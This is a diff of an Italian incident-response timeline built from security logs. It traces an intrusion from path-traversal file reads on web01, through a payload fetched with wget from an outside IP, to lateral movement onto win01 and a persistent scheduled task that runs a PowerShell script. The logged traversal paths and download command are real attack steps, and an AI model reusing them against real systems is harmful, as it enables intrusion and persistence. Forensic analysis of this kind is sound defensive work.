@@ -16,7 +16,7 @@ Security logs
 
 # Accesso Iniziale: Da LFI a RCE su web01
 ```
-Initial Recon / Exploitation on web01
+Recon / Exploitation (web01)
  └── 09:12:14 web01 nginx --> LFI: /reports/view.php?doc=../../../../../../etc/passwd (trace_id=tr-A)
      └── php-fpm → accessed /etc/passwd
  └── 09:12:16 web01 nginx -> LFI: /download.php?file=../../../var/log/auth.log (trace_id=tr-B)
@@ -43,7 +43,7 @@ In breve, l’attaccante è partito leggendo file di sistema, ma è riuscito ad 
 
 # Fase di Attacco: Consegna del Payload su web01
 ```
- Payload Delivery on web01
+ Consegna del Payload su web01
  └── 09:18:41 web01 nginx -> LFI: /download.php?file=../../../../etc/hosts (trace_id=tr-B)
      └── 09:18:42 auditd -> wget http://198.51.100.91/.s → saved as /tmp/.svc
      └── 09:19:03 auditd -> chmod +x /tmp/.svc
@@ -58,7 +58,7 @@ Questo mi conferma che il payload è stato non solo consegnato, ma anche attivat
 # Movimento Laterale: Tentativo da web01 verso win01
 
 ```
-Lateral Movement Attempt from web01 -> win01
+Movimento Laterale-- Tentativo web01 -> win01
  └── 09:21:05 web01 auditd -> python3 one-liner to ssh admin@win01 (trace_id=tr-A)
      └── 09:24:11 win01 Security -> Logon failure admin from 10.10.5.21
      └── 09:24:59 win01 Security -> Successful logon svc_webapp from 10.10.5.21
@@ -71,7 +71,7 @@ Ma alle 09:24:59, la situazione cambia: c’è un accesso riuscito, stavolta con
 # Persistenza: Installazione di Meccanismi su win01
 
 ```
-Persistence on win01
+Persistenza su win01
  └── 09:25:07 TaskScheduler EventID=106 -> Task registered "\System\UpdaterCache"
      Action = powershell.exe -File C:\ProgramData\upc.ps1 (trace_id=tr-B)
  └── 09:25:11 Sysmon 11 -> FileCreate C:\ProgramData\upc.ps1 (by powershell.exe)
